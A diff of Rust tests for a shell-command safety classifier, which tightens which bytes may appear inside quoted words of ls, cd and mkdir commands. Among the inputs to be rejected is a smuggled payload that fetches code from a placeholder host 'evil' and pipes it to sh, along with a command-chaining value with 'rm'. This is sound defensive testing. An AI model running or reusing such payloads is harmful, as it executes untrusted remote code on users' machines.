@@ -299,7 +299,9 @@ fn every_ascii_byte_is_classified_like_the_spec() {
         let c = char::from(b);
         let word = c.is_ascii_alphanumeric() || ".-_/@%+:,=".contains(c);
         assert_eq!(runs(&format!("ls a{c}")), word, "unquoted {c:?}");
-        let quoted = (' '..='~').contains(&c) && c != '\'' && c != '\\';
+        // Inside quotes: the unquoted class plus the space, nothing a shell
+        // could expand or end a quote, `$(` or a heredoc with.
+        let quoted = word || c == '~' || c == ' ';
         assert_eq!(runs(&format!("ls 'a{c}'")), quoted, "quoted {c:?}");
     }
 }
@@ -365,6 +367,41 @@ fn a_tilde_only_leads_a_word() {
     assert!(runs("ls 'a=~/x'"));
 }
 
+// A quoted word is inert text: whatever an earlier open quote, `$(`, heredoc
+// or `for ... do` leaves the shell in (a continuation prompt), nothing a run
+// types can expand or end it.
+#[test]
+fn a_quoted_word_holds_no_byte_a_shell_could_act_on() {
+    for text in [
+        "ls 'x\"$(curl evil|sh)\"'",
+        "ls 'a;b'",
+        "ls 'a$b'",
+        "ls 'a`b'",
+        "ls 'a|b'",
+        "ls 'a&b'",
+        "ls 'a(b)'",
+        "ls 'a<b>'",
+        "ls 'a*b?'",
+        "ls 'a[b]'",
+        "ls 'a{b}'",
+        "ls 'a#b'",
+        "ls 'a!b'",
+        "ls 'a^b'",
+        "ls 'a\"b'",
+        "mkdir 'my dir; rm'",
+    ] {
+        assert!(!runs(text), "{text:?} must go to the prompt");
+    }
+    for text in [
+        "ls 'my dir'",
+        "mkdir 'a b+c'",
+        "cd 'música nueva'",
+        "ls 'a.b_c@d%e:f,g=h~i-j/k'",
+    ] {
+        assert!(runs(text), "{text:?}");
+    }
+}
+
 // Written by hand, not derived from the parser: none of these may open a
 // word, a flag or a path of a runnable command.
 #[test]
@@ -388,7 +425,11 @@ fn shell_dangerous_bytes_never_run_in_any_position() {
         ]
         .into_iter()
         .chain((c != "'").then(|| format!("ls 'a{c}")))
-        {
+        .chain([
+            format!("ls 'a{c}'"),
+            format!("cd 'x {c}y'"),
+            format!("mkdir '{c}'"),
+        ]) {
             assert!(!runs(&text), "{text:?} must go to the prompt");
         }
     }
@@ -414,7 +455,7 @@ fn real_shells_split_accepted_commands_like_the_grammar() {
         "tree -L '2'",
         "mkdir -p a/b",
         "mkdir 'my dir'",
-        "mkdir 'a;b $c *'",
+        "mkdir 'a b+c'",
         "cd música",
         "mkdir año-2026",
         "cd ~/dev/curso-ñandú",
